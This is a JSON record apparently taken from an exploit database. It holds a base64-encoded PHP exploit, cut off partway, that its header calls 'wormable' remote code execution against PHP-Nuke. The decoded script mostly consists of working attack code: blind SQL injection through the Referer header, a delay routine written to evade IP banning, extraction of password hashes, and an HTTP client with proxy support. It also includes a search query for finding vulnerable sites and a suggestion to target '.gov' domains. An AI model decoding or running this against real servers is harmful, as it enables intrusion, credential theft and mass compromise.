{
    "source": "exploit-database", 
    "exploit": "IyEvdXNyL2Jpbi9waHANCjw/cGhwDQovKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KV29ybWFibGUgUmVtb3RlIENvZGUgRXhlY3V0aW9uIGluIFBIUC1OdWtlIDcuMC84LjEvOC4xLjM1KG5ld2lzdCBhcyBvZiByZWxlYXNlKQ0KVmVuZG9yJ3MgV2Vic2l0ZTpodHRwOi8vcGhwbnVrZS5vcmcvDQpTZWN1aXJ0eSBSZXNlYXJjaGVyOiBNaWNoYWVsIEJyb29rcyAoaHR0cHM6Ly9zaXRld2F0LmNoKQ0KT3JpZ2luYWwgQWR2aXNvcnk6IGh0dHA6Ly9ibG9nLnNpdGV3YXQuY2gvMjAxMC8wNS92dWxuZXJhYmlsaXRpZXMtaW4tcGhwLW51a2UuaHRtbA0KDQpHb29nbGUgaGFjazoNCiJGcmFuY2lzY28gQnVyemkiICAiUGFnZSBHZW5lcmF0aW9uOiIgIFNlY29uZHMgaW51cmw6bW9kdWxlcy5waHANCjEsMTcwLDAwMCByZXN1bHRzDQphZGQgaW51cmw6Z292IHRvIHRoZSBnb29nbGUgaGFjayBpZiB5b3Ugd2FudCB0byBtYWtlIHRoZSBuZXdzIDspDQpXb3JrcyB3aXRoIG1haWdpY19xdW90ZXNfZ3BjPU9uIG9yIE9mZg0KV29ya3Mgd2l0aCBBcHBBcm1vciBhbmQgU3Vob3NpbiBIYWRlbmQtUEhQLCB0ZXN0ZWQgb24gVWJ1bnR1IDkuMDQgYW5kIDEwLjA0DQpNeSBvd24gTEZJK1NRTEkgYXR0YWNrIGlzIHVzZWQgdG8gYnlwYXNzIEFwcEFybW9yIQ0KQWxzbyB0ZXN0ZWQgWEFNUFAgb24gV2luZG93cyBYUA0KQWxsIHRlc3RzIHdoZXJlIGRvbmUgd2l0aCBNeVNRTDUgYW5kIFBIUDUNClRvIG9idGFpbiBhIHVzZXIncyBjb29raWU6DQoxKSBSZWdpc3RlciBhIG5vcm1hbCBhY2NvdW50DQoyKSBMb2dpbg0KMykgVHlwZSB0aGlzIGludG8gdGhlIHNhbWUgYWRkcmVzcyBiYXIgYW5kIGhpdCBlbnRlcjogamF2YXNjcmlwdDpkb2N1bWVudC5jb29raWUNClRvIHNldCBhIGNvb2tpZSB5b3UgY2FuIGRvIHVzZSB0aGlzOiBqYXZhc2NyaXB0OmRvY3VtZW50LmNvb2tpZT0iYWRtaW49TWpwaFpHMXBiam95TVRJek1tWXlPVGRoTlRkaE5XRTNORE00T1RSaE1HVTBZVGd3TVdaak16b3hNRG82TURvd09qQTZNRHBFWldWd1FteDFaVG8wTURrMiINCioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKiovDQpzZXRfdGltZV9saW1pdCgwKTsNCi8vVGhlIGJsaW5kX3NxbF9pbmplY2l0b24gY2Fsc3MgaXMgYSBnZW5lcmFsIGV4cGxvaXQgZnJhbWV3b3JrIHRoYXQgd2UgYXJlIGluaGVyaXRpbmcuDQpjbGFzcyBwaHBfbnVrZV9ibGluZF9zcWxfaW5qZWN0aW9uIGV4dGVuZHMgYmxpbmRfc3FsX2luamVjdGlvbiB7DQogICAgLy9UaGlzIGlzIHRoZSBibGluZCBzcWwgaW5qZWN0aW9uIHJlcXVlc3QuDQogICAgZnVuY3Rpb24gcXVlcnkoJGNoZWNrKXsNCiAgICAgICAgLy9SYXRlIGxpbWl0ZXIgdG8gYnlwYXNzIGlwYmFuLnBocCdzIHByb3RlY3Rpb24uDQogICAgICAgIC8vTXVzdCBzdGF5IGJlbG93IDUgcmVxdWVzdHMgZXZlcnkgMiBzZWNvbmRzLg0KICAgICAgICBpZighKCR0aGlzLT5yZXF1ZXN0X2NvdW50JTQpKXsNCiAgICAgICAgICAgIHNsZWVwKDIpOw0KICAgICAgICB9DQogICAgICAgIC8vYnVpbGQgdGhlIGh0dHAgcmVxdWVzdCB0byBJbmplY3QgYSBxdWVyeToNCiAgICAgICAgLy9UaGlzIGlzIGEgc2ltcGxlIGdldCByZXF1ZXN0IHdpdGggYSBjdXN0b20gcmVmZXJlcg0KCSAgICAgLy8kdGhpcy0+c2V0X3JlZmVyZXIoIic9Ii9cKiIgIChzZWxlY3QgIi4kY2hlY2suIiBmcm9tIG51a2VfYXV0aG9ycyBsaW1pdCAxKSktLSAqLyIpOw0KICAgICAgICAkdGhpcy0+c2V0X3JlZmVyZXIoIic9KHNlbGVjdCAiLiRjaGVjay4iIGZyb20gbnVrZV9hdXRob3JzIGxpbWl0IDEpKS0tIDEiKTsNCiAgICAgICAgLypleGFtcGxlIGdldCBhbmQgcG9zdCByZXF1ZXN0Lg0KICAgICAgICAqJHRoaXMtPnNldF9nZXQoImlkPTEgb3IgKHNlbGVjdCAiLiRjaGVjay4iIGZyb20gbnVrZV9hdXRob3JzIGxpbWl0IDEpKSI7Ly8kX0dFVFtpZF0NCiAgICAgICAgKiR0aGlzLT5zZXRfcG9zdCgiaWQ9MSBvciAoc2VsZWN0ICIuJGNoZWNrLiIgZnJvbSBudWtlX2F1dGhvcnMgbGltaXQgMSkpIik7Ly8kX1BPU1RbaWRdDQogICAgICAgICovDQogICAgfQ0KfQ0KLy9UaGlzIGlzIGEgdmVyeSBlZmZpY2llbnQgYmxpbmQgc3FsIGluamVjdGlvbiBjbGFzcy4gDQpjbGFzcyBibGluZF9zcWxfaW5qZWN0aW9uew0KICAgIHZhciAkdXJsLCAkYmFja3VwX3VybCwgJHJlc3VsdCwgJGh0dHAsICRyZXF1ZXN0X2NvdW50LCAkdGltZW91dDsNCiAgICBmdW5jdGlvbiBibGluZF9zcWxfaW5qZWN0aW9uKCR1cmwsJHRpbWVvdXQ9MTApew0KICAgICAgICAkdGhpcy0+cmVxdWVzdF9jb3VudD0wOw0KICAgICAgICAkdGhpcy0+dXJsPSR1cmw7DQogICAgICAgICR0aGlzLT5iYWNrdXBfdXJsPSR1cmw7DQogICAgICAgICR0aGlzLT5odHRwPW5ldyBodHRwX2NsaWVudCgpOw0KICAgICAgICAkdGhpcy0+dGltZW91dD0kdGltZW91dDsNCiAgICB9DQogICAgZnVuY3Rpb24gc2V0X2dldCgkZ2V0KXsNCiAgICAgICAgJHRoaXMtPnVybD0kdGhpcy0+dXJsLiI/Ii4kZ2V0Ow0KICAgIH0NCiAgICBmdW5jdGlvbiBzZXRfcmVmZXJlcigkcmVmZXJlcil7DQogICAgICAgICR0aGlzLT5odHRwLT5yZWZlcmVyPSRyZWZlcmVyOw0KICAgIH0NCiAgICBmdW5jdGlvbiBzZXRfcG9zdCgkcG9zdCl7DQogICAgICAgICR0aGlzLT5odHRwLT5wb3N0ZGF0YT0kcG9zdDsNCiAgICB9DQogICAgZnVuY3Rpb24gdGVzdF90YXJnZXQoKXsNCiAgICAgICAgcmV0dXJuICR0aGlzLT5zZW5kKCJpZih0cnVlLHNsZWVwKCIuJHRoaXMtPnRpbWVvdXQuIiksMCkiKSYmISR0aGlzLT5zZW5kKCJpZihmYWxzZSxzbGVlcCgiLiR0aGlzLT50aW1lb3V0LiIpLDApIik7DQogICAgfQ0KICAgIGZ1bmN0aW9uIG51bV90b19oZXgoJGFycil7DQogICAgICAgICRyZXQ9Jyc7DQogICAgICAgIGZvcmVhY2goJGFyciBhcyAkYSl7DQogICAgICAgICAgICBpZigkYTw9OSl7DQogICAgICAgICAgICAgICAgJHJldC49JGE7DQogICAgICAgICAgICB9ZWxzZXsNCiAgICAgICAgICAgICAgICAkcmV0Lj1jaHIoODcrJGEpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHJldHVybiAkcmV0Ow0KICAgIH0NCiAgICAvL0xvb2tpbmcgZm9yIGEgc3RyaW5nIG9mIGxlbmd0aCAzMiBhbmQgYmFzZSAxNiBpbiBhc2NpaSBjaGFycy4NCiAgICBmdW5jdGlvbiBmaW5kX21kNSgkY29sdW1uKXsNCiAgICAgICAgcmV0dXJuICR0aGlzLT5udW1fdG9faGV4KCR0aGlzLT5iaW5fZmluZGVyKDE2LDMyLCJjb252KHN1YnN0cmluZygkY29sdW1uLCVzLDEpLDE2LDEwKSIpKTsNCiAgICB9DQogICAgZnVuY3Rpb24gZmluZF9zaGExKCRjb2x1bW4pew0KICAgICAgICByZXR1cm4gJHRoaXMtPm51bV90b19oZXgoJHRoaXMtPmJpbl9maW5kZXIoMTYsNDAsImNvbnYoc3Vic3RyaW5nKCRjb2x1bW4sJXMsMSksMTYsMTApIikpOw0KICAgIH0NCiAgICAvL0xvb2sgZm9yIGFuIGFzY2lpIHN0cmluZyBvZiBhcmJpdHJhcnkgbGVuZ3RoLg0KICAgIGZ1bmN0aW9uIGZpbmRfc3RyaW5nKCRjb2x1bW4pew0KICAgICAgICAkcmV0PScnOw0KICAgICAgICAvL0EgbGVuZ3RoIG9mIHplcm8gbWVhbnMgd2UgYXJlIGxvb2tpbmcgZm9yIGEgbnVsbCBieXRlIHRlcm1pbmF0ZWQgc3RyaW5nLg0KICAgICAgICAkcmVzdWx0PSR0aGlzLT5iaW5fZmluZGVyKDEyOCwwLCJhc2NpaShzdWJzdHJpbmcoJGNvbHVtbiwlcywxKSkiKTsNCiAgICAgICAgZm9yZWFjaCgkcmVzdWx0IGFzICRyKXsNCiAgICAgICAgICAgICRyZXQuPWNocigkcik7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICRyZXQ7DQogICAgfQ0KICAgIC8vcXVlcnkoKSBpcyBhIG1ldGhvZCB0aGF0IGdlbmVyYXRlcyB0aGUgc3FsIGluamVjdGlvbiByZXF1ZXN0DQogICAgZnVuY3Rpb24gcXVlcnkoJGNoZWNrKXsNCiAgICAgICAgLy9UaGlzIGZ1bmN0aW9uIG11c3QgYmUgb3ZlcnJpZGRlbi4NCiAgICB9DQogICAgZnVuY3Rpb24gcmVjaGVjaygkcmVzdWx0LCRxdWVzdGlvbiwkYmFzZSl7DQogICAgICAgJHRoaXMtPmJpbl9maW5kZXIoJGJhc2UsMSwkcXVlc3Rpb24sJHN0YXJ0KTsNCiAgICAgICAvL0ZvcmNlIGEgbG9uZyB0aW1lb3V0Lg0KICAgICAgICR0bXBfdGltZW91dD0kdGhpcy0+dGltZW91dDsNCiAgICAgICBpZigkdGhpcy0+dGltZW91dDwxMCl7DQogICAgICAgICAgJHRoaXMtPnRpbWVvdXQ9MTA7DQogICAgICAgfWVsc2V7DQogICAgICAgICAgJHRoaXMtPnRpbWVvdXQ9JHRoaXMtPnRpbWVvdXQqMjsNCiAgICAgICB9DQogICAgICAgJGw9MTsNCiAgICAgICBmb3JlYWNoKCRyZXN1bHQgYXMgJHIpew0KICAgICAgICAgIGlmKCR0aGlzLT5zZW5kKCJpZigiLnNwcmludGYoJHF1ZXN0aW9uLCRsKS4iIT0iLiRyLiIsc2xlZXAoIi4kdGhpcy0+dGltZW91dC4iKSwwKSIpKXsNCiAgICAgICAgICAgICAgJHJlc3VsdFtdPSRiOw0KICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICB9DQogICAgICAgICAgJGwrKzsNCiAgICAgICB9DQogICAgICAgJHRoaXMtPnRpbWVvdXQ9JHRtcF90aW1lb3V0Ow0KICAgIH0NCiAgICBmdW5jdGlvbiBsaW5lYXJfZmluZGVyKCRiYXNlLCRsZW5ndGgsJHF1ZXN0aW9uKXsNCiAgICAgICAgZm9yKCRsPTE7JGw8PSRsZW5ndGg7JGwrKyl7DQogICAgICAgICAgICBmb3IoJGI9MDskYjwkYmFzZTskYisrKXsNCiAgICAgICAgICAgICAgICBpZigkdGhpcy0+c2VuZCgiaWYoIi5zcHJpbnRmKCRxdWVzdGlvbiwkbCkuIj0iLiRiLiIsc2xlZXAoIi4kdGhpcy0+dGltZW91dC4iKSwwKSIpKXsNCiAgICAgICAgICAgICAgICAgICAgJHJlc3VsdFtdPSRiOw0KICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQogICAgI0JpbmFyeSBzZWFyY2ggZm9yIG15c3FsIGJhc2VkIHNxbCBpbmplY3Rpb24uDQogICAgZnVuY3Rpb24gYmluX2ZpbmRlcigkYmFzZSwkbGVuZ3RoLCRxdWVzdGlvbil7DQogICAgICAgICAkc3RhcnRfcG9zPTE7DQogICAgICAgICRyZXN1bHQ9Jyc7DQogICAgICAgIGZvcigkY3VyPSRzdGFydF9wb3M7JGN1cjw9JGxlbmd0aHx8JGxlbmd0aD09MDskY3VyKyspew0KICAgICAgICAgICAgJG49JGJhc2UtMTsNCiAgICAgICAgICAgICRsb3c9MDsNCiAgICAgICAgICAgICRmbG9vcj0kbG93Ow0KICAgICAgICAgICAgJGhpZ2g9JG4tMTsNCiAgICAgICAgICAgICRwb3M9ICRsb3crKCgkaGlnaC0kbG93KS8yKTsNCiAgICAgICAgICAgICRmb3VuZD1mYWxzZTsNCiAgICAgICAgICAgIHdoaWxlKCRsb3c8PSRoaWdoJiYhJGZvdW5kKXsNCiAgICAgICAgICAgICAgICAjYXNraW5nIHRoZSBzcWwgZGF0YWJhc2UgaWYgdGhlIGN1cnJlbnQgdmFsdWUgaXMgZ3JlYXRlciB0aGFuICRwb3MNCiAgICAgICAgICAgICAgICBpZigkdGhpcy0+c2VuZCgiaWYoZ3JlYXRlc3QoIi5zcHJpbnRmKCRxdWVzdGlvbiwkY3VyKS4iLCIuJHBvcy4iKSE9Ii4kcG9zLiIsc2xlZXAoIi4kdGhpcy0+dGltZW91dC4iKSwwKSIpKXsNCiAgICAgICAgICAgICAgICAgICAgI2lmIHRoaXMgaXMgdHJ1ZSB0aGVuIHRoZSB2YWx1ZSBtdXN0IGJlIHRoZSBtb2R1bHVzLg0KICAgICAgICAgICAgICAgICAgICBpZigkcG9zPT0kbi0xKXsNCiAgICAgICAgICAgICAgICAgICAgICAgJHJlc3VsdFtdPSRwb3MrMTsNCiAgICAgICAgICAgICAgICAgICAgICAgJGZvdW5kPXRydWU7DQogICAgICAgICAgICAgICAgICAgIH1lbHNlew0KICAgICAgICAgICAgICAgICAgICAgICAgJGxvdz0kcG9zKzE7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAjYXNraW5nIHRoZSBzcWwgZGF0YWJhc2UgaWYgdGhlIGN1cnJlbnQgdmFsdWUgaXMgbGVzcyB0aGFuICRwb3MNCiAgICAgICAgICAgICAgICB9ZWxzZSBpZigkdGhpcy0+c2VuZCgiaWYobGVhc3QoIi5zcHJpbnRmKCRxdWVzdGlvbiwkY3VyKS4iLCIuJHBvcy4iKSE9Ii4kcG9zLiIsc2xlZXAoIi4kdGhpcy0+dGltZW91dC4iKSwwKSIpKXsNCiAgICAgICAgICAgICAgICAgICAjaWYgdGhpcyBpcyB0cnVlIHRoZSB2YWx1ZSBtdXN0IGJlIHplcm8sIG9yIGluIHRoZSBjYXNlIG9mIGFzY2lpLCAgYSBudWxsIGJ5dGUuDQogICAgICAgICAgICAgICAgICAgaWYoJHBvcz09JGZsb29yKzEpew0KICAgICAgICAgICAgICAgICAgICAgICAgJGZvdW5kPXRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICAjV2UgaGF2ZSBmb3VuZCB0aGUgbnVsbCB0ZXJtaW5hdG9yIHNvIHdlIGhhdmUgZmlubmlzaGVkIG91ciBzZWFyY2ggZm9yIGEgc3RyaW5nLg0KICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGxlbmd0aD09MCl7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGxlbmd0aD0tMTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH1lbHNlew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRyZXN1bHRbXT0kcG9zLTE7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH1lbHNlew0KICAgICAgICAgICAgICAgICAgICAgICAgJGhpZ2g9JHBvcy0xOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfWVsc2V7DQogICAgICAgICAgICAgICAgICAgICNib3RoIGdyZWF0ZXIgdGhhbiBhbmQgbGVzcyB0aGVuIHdoZXJlIGFza2VkLCBzbyBzbyB0aGVuIHRoZSBhbnN3ZXIgaXMgb3VyIGd1ZXNzICRwb3MuDQogICAgICAgICAgICAgICAgICAgICRyZXN1bHRbXT0kcG9zOw0KICAgICAgICAgICAgICAgICAgICAkZm91bmQ9dHJ1ZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgJHBvcz0kbG93KygoJGhpZ2gtJGxvdykvMik7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBwcmludCgiLiIpOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiAkcmVzdWx0Ow0KICAgIH0NCiAgICAvL0ZpcmUgb2ZmIHRoZSByZXF1ZXN0DQogICAgZnVuY3Rpb24gc2VuZCgkcXVlc2l0b24pew0KICAgICAgICAvL2J1aWxkIHRoZSBpbmplY3RlZCBxdWVyeS4NCiAgICAgICAgJHRoaXMtPnF1ZXJ5KCRxdWVzaXRvbik7DQogICAgICAgICRzdGFydD10aW1lKCk7DQogICAgICAgICRyZXNwPSR0aGlzLT5odHRwLT5zZW5kKCR0aGlzLT51cmwpOw0KICAgICAgICAvL2JhY2t1cF91cmwgaXMgZm9yIHNldF9nZXQoKQ0KICAgICAgICAkdGhpcy0+dXJsPSR0aGlzLT5iYWNrdXBfdXJsOw0KICAgICAgICAkdGhpcy0+cmVxdWVzdF9jb3VudCsrOw0KICAgICAgICByZXR1cm4gKHRpbWUoKS0kc3RhcnQ+PSR0aGlzLT50aW1lb3V0KTsNCiAgICB9DQogICAgLy9yZXRyb0dvZCBSSVANCiAgICBmdW5jdGlvbiBjaGFyRW5jb2RlKCRzdHJpbmcpew0KICAgICAgICAkY2hhcj0iY2hhcigiOw0KICAgICAgICAkc2l6ZT1zdHJsZW4oJHN0cmluZyk7DQogICAgICAgIGZvcigkeD0wOyR4PCRzaXplOyR4Kyspew0KICAgICAgICAgICAgJGNoYXIuPW9yZCgkc3RyaW5nWyR4XSkuIiwiOw0KICAgICAgICB9DQogICAgICAgICRjaGFyW3N0cmxlbigkY2hhciktMV09IiklMDAiOw0KICAgICAgICByZXR1cm4gJGNoYXI7DQogICAgfQ0KfQ0KLy9HZW5lcmFsIHB1cnBvc2UgaHR0cCBjbGllbnQgdGhhdCB3b3JrcyBvbiBhIGRlZmF1bHQgcGhwIGluc3RhbGwuIA0KY2xhc3MgaHR0cF9jbGllbnR7DQogICAgdmFyICRwcm94eV9pcD0nJywgJHByb3h5X3BvcnQ9JycsICRwcm94eV9uYW1lPScnLCAkcHJveHlfcGFzcz0nJywgJHJlZmVyZXI9JycsJGNvb2tpZT0nJywkcG9zdGRhdGE9Jyc7DQogICAgZnVuY3Rpb24gc2VuZCgkbG9jKXsNCiAgICAgICAgIC8vb3ZlcmxvYWQgZnVuY3Rpb24gcG9seW1vcnBoaXNtIGJldHdlZW4gZ2V0cyBhbmQgcG9zdHMNCiAgICAgICAgICR1cmw9cGFyc2VfdXJsKCRsb2MpOw0KICAgICAgICAgaWYoIWlzc2V0KCR1cmxbJ3BvcnQnXSkpew0KICAgICAgICAgICAgJHVybFsncG9ydCddPTgwOw0KICAgICAgICB9DQogICAgICAgICAkdWE9J0ZpcmVmb3gnOw0KICAgICAgICAgaWYoJHRoaXMtPnByb3h5X2lwIT0nJyYmJHRoaXMtPnByb3h5X3BvcnQhPScnKXsNCiAgICAgICAgICAgICRmcCA9IHBmc29ja29wZW4oICR0aGlzLT5wcm94eV9pcCwgJHRoaXMtPnByb3h5X3BvcnQsICYkZXJybm8sICYkZXJyc3RyLCAxMjAgKTsNCiAgICAgICAgICAgICR1cmxbJ3BhdGgnXT0kdXJsWydob3N0J10uJzonLiR1cmxbJ3BvcnQnXS4kdXJsWydwYXRoJ107DQogICAgICAgICB9ZWxzZXsNCiAgICAgICAgICAgICRmcCA9IGZzb2Nrb3BlbiggJHVybFsnaG9zdCddLCAkdXJsWydwb3J0J10sICYkZXJybm8sICYkZXJyc3RyLCAxMjAgKTsNCiAgICAgICAgIH0NCiAgICAgICAgIGlmKCAhJGZwICkgew0KICAgICAgICAgICAgcHJpbnQgIiRlcnJzdHIgKCRlcnJubyk8YnI+XG5uIjsNCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBpZiggJHRoaXMtPnBvc3RkYXRhPT0nJyApIHsNCiAgICAgICAgICAgICAgICAkcmVxdWVzdD0iR0VUICIuJHVybFsncGF0aCddLiI/Ii4kdXJsWydxdWVyeSddLiIgSFRUUC8xLjFcclxuIjsNCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgJHJlcXVlc3Q9IlBPU1QgIi4kdXJsWydwYXRoJ10uIj8iLiR1cmxbJ3F1ZXJ5J10uIiBIVFRQLzEuMVxyXG4iOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgaWYoJHRoaXMtPnByb3h5X25hbWUhPScnJiYkdGhpcy0+cHJveHlfcGFzcyE9Jycpew0KICAgICAgICAgICAgICAgICRyZXF1ZXN0Lj0iUHJveHktQXV0aG9yaXphdGlvbjogQmFzaWMgIi5iYXNlNjRfZW5jb2RlKCR0aGlzLT5wcm94eV9uYW1lLiI6Ii4kdGhpcy0+cHJveHlfcGFzcykuIlxyXG5cclxuIjsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICRyZXF1ZXN0Lj0iSG9zdDogIi4kdXJsWydob3N0J10uIjoiLiR1cmxbJ3BvcnQnXS4iXHJcbiI7DQogICAgICAgICAgICAkcmVxdWVzdC49IlVzZXItQWdlbnQ6ICIuJHVhLiJcclxuIjsNCiAgICAgICAgICAgICRyZXF1ZXN0Lj0iQWNjZXB0OiB0ZXh0L3BsYWluXHJcbiI7DQogICAgICAgICAgICBpZigkdGhpcy0+cmVmZXJlciE9Jycpew0KICAgICAgICAgICAgICAgICRyZXF1ZXN0Lj0iUmVmZXJlcjogIi4kdGhpcy0+cmVmZXJlci4iXHJcbiI7DQogICAgICAgICAgICB9DQogICAgICAgICAgICAkcmVxdWVzdC49IkNvbm5lY3Rpb246IENsb3NlXHJcbiI7DQogICAgICAgICAgICBpZigkdGhpcy0+Y29va2llIT0nJyl7DQogICAgICAgICAgICAgICAgJHJlcXVlc3QuPSJDb29raWU6ICIuJHRoaXMtPmNvb2tpZS4iXHJcbiIgOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgaWYoICR0aGlzLT5wb3N0ZGF0YSE9JycgKSB7DQogICAgICAgICAgICAgICAgJHN0cmxlbmd0aCA9IHN0cmxlbiggJHRoaXMtPnBvc3RkYXRhICk7DQogICAgICAgICAgICAgICAgJHJlcXVlc3QuPSJDb250ZW50LXR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZFxyXG4iIDsNCiAgICAgICAgICAgICAgICAkcmVxdWVzdC49IkNvbnRlbnQtbGVuZ3RoOiAiLiRzdHJsZW5ndGguIlxyXG5cclxuIjsNCiAgICAgICAgICAgICAgICAkcmVxdWVzdC49JHRoaXMtPnBvc3RkYXRhOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZnB1dHMoICRmcCwgJHJlcXVlc3QuIlxyXG5cclxuIiApOw0KICAgICAgICAgICAgICAgd2hpbGUoICFmZW9mKCAkZnAgKSApIHsNCiAgICAgICAgICAgICAgICAgICAkb3V0cHV0IC49IGZnZXRzKCAkZnAsIDEwMjQgKTsNCiAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGZjbG9zZSggJGZwICk7DQogICAgICAgICAgICAvL3BocF9udWtlIG9ubHk6DQogICAgICAgICAgICBpZihzdHJzdHIoJG91dHB1dCwidG9vIG1hbnkgcGFnZSBsb2FkcyIpKXsNCiAgICAgICAgICAgICAgICBwcmludCAiUkVRVUVTVCBDQVAgSElUIVxuIjsNCiAgICAgICAgICAgICAgICBwcmludF9yKGRlYnVnX2JhY2t0cmFjZSgpKTsNCiAgICAgICAgICAgICAgICBwcmludCAiUkVRVUVTVCBDQVAgSElUIVxuIjsNCiAgICAgICAgICAgICAgICBkaWUoKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiAkb3V0cHV0Ow0KICAgICAgICAgfQ0KICAgIH0NCiAgICAvL1VzZSBhIGh0dHAgcHJveHkNCiAgICBmdW5jdGlvbiBwcm94eSgkcHJveHkpeyAvL3VzZXI6cGFzc0BpcDpwb3J0DQogICAgICAgICRwcm94eUF1dGg9ZXhwbG9kZSgnQCcsJHByb3h5KTsNCiAgICAgICAgaWYoaXNzZXQoJHByb3h5QXV0aFsxXSkpew0KICAgICAgICAgICAgJGxvZ2luPWV4cGxvZGUoJzonLCRwcm94eUF1dGhbMF0pOw0KICAgICAgICAgICAgJHRoaXMtPnByb3h5X25hbWU9JGxvZ2luWzBdOw0KICAgICAgICAgICAgJHRoaXMtPnByb3h5X3Bhc3M9JGxvZ2luWzFdOw0KICAgICAgICAgICAgJGFkZHI9ZXhwbG9kZSgnOicsJHByb3h5QXV0aFsxXSk7DQogICAgICAgIH1lbHNlew0KICAgICAgICAgICAgJGFkZHI9ZXhwbG9kZSgnOicsJHByb3h5KTsNCiAgICAgICAgfQ0KCSAgICAgJHRoaXMtPnByb3h5X2lwPSRhZGRyWzBdOw0KICAgICAgICAkdGhpcy0+cHJveHlfcG9ydD0kYWRkclsxXTsNCiAgICB9DQogICAgLy9QYXJzZXMgdGhlIHJlc3VsdHMgZnJvbSBhIFBIUCBlcnJvciB0byB1c2UgYXMgYSBwYXRoIGRpc2Nsb3N1cmUuDQogICAgZnVuY3Rpb24gZ2V0UGF0aCgkdXJsLCRwb3BzPTEpew0KICAgICAgICAkaHRtbD0kdGhpcy0+c2VuZCgkdXJsKTsNCiAgICAgICAgLy9SZWd1bGFyIGVycm9yIHJlcG9ydGluZzoNCiAgICAgICAgJHJlc3A9ZXhwbG9kZSgiYXJyYXkgZ2l2ZW4gaW4gPGI+IiwkaHRtbCk7DQogICAgICAgIGlmKGlzc2V0KCRyZXNwWzFdKSl7DQogICAgICAgICAgICAkcmVzcCA9IGV4cGxvZGUoIjwvYj4iLCRyZXNwWzFdKTsNCiAgICAgICAgfWVsc2V7DQogICAgICAgICAgICAvL3hkZWJ1ZydzIGVycm9yIHJlcG9ydGluZzoNCiAgICAgICAgICAgICRyZXNwPWV4cGxvZGUoImFycmF5IGdpdmVuIGluICIsJGh0bWwpOw0KICAgICAgICAgICAgaWYoaXNzZXQoJHJlc3BbMV0pKXsNCiAgICAgICAgICAgICAgICAkcmVzcCA9IGV4cGxvZGUoIiAiLCRyZXNwWzFdKTsNCiAgICAgICAgICAgIH1lbHNlew0KICAgICAgICAgICAgICAgICRyZXNwWzBdPWZhbHNlOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgICRwYXRoPSRyZXNwWzBdOw0KICAgICAgICAvL0Nhbid0IHVzZSBkaXJuYW1lKCkNCiAgICAgICAgaWYoc3Ryc3RyKCRwYXRoLCJcXCIpKXsNCiAgICAgICAgICAgJHA9ZXhwbG9kZSgiXFwiLCRwYXRoKTsNCiAgICAgICAgICAgZm9yKCR4PTA7JHg8JHBvcHM7JHgrKyl7DQogICAgICAgICAgICAgICBhcnJheV9wb3AoJHApOw0KICAgICAgICAgICB9DQogICAgICAgICAgICRwYXRoPWltcGxvZGUoIlxcIiwkcCk7DQogICAgICAgIH1lbHNlew0KICAgICAgICAgICAkcD1leHBsb2RlKCIvIiwkcGF0aCk7DQogICAgICAgICAgIGZvcigkeD0wOyR4PCRwb3BzOyR4Kyspew0KICAgICAgICAgICAgICAgYXJyYXlfcG9wKCRwKTsNCiAgICAgICAgICAgfQ0KICAgICAgICAgICAkcGF0aD1pbXBsb2RlKCIvIiwkcCk7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICRwYXRoOw0KICAgIH0NCiAgICAvL0dyYWIgdGhlIHNlcnZlciB0eXBlIGZyb20gdGhlIGh0dHAgaGVhZGVyLg0KICAgIGZ1bmN0aW9uIGdldFNlcnZlcigkdXJsKXsNCiAgICAgICAgJHJlc3A9JHRoaXMtPnNlbmQoJHVybCk7DQogICAgICAgICRoZWFkZXI9ZXhwbG9kZSgiU2VydmVyOiAiLCRyZXNwKTsNCiAgICAgICAgJHNlcnZlcj1leHBsb2RlKCJcbiIsJGhlYWRlclsxXSk7DQogICAgICAgIHJldHVybiAkc2VydmVyWzBdOw0KICAgIH0NCn0NCmZ1bmN0aW9uIG1haW4oKXsNCiAgICR1c2VyX2lucHV0PWdldG9wdCgidDpjOmE6Iik7DQogICBpZigkdXNlcl9pbnB1dFsndCddKXsNCiAgICAgICRhdHRhY2tfdXJsPSR1c2VyX2lucHV0Wyd0J107DQogICAgICBpZigkdXNlcl9pbnB1dFsnYyddKXsNCiAgICAgICAgICR1c2VyX2Nvb2tpZT0kdXNlcl9pbnB1dFsnYyddOw0KICAgICAgfQ0KICAgICAgLy9UaGlzIGlzIG9ubHkgdXNlZnVsIGZvciBkZWJ1Z2dpbmcsICBzbyBpdHMgbm90IGxpc3RlZCBpbiB0aGUgdXNlYWdlLg0KICAgICAgaWYoJHVzZXJfaW5wdXRbJ2EnXSl7DQogICAgICAgICAkYWRtaW5fY29va2llPSR1c2VyX2lucHV0WydhJ107DQogICAgICB9DQogICB9ZWxzZXsNCiAgICA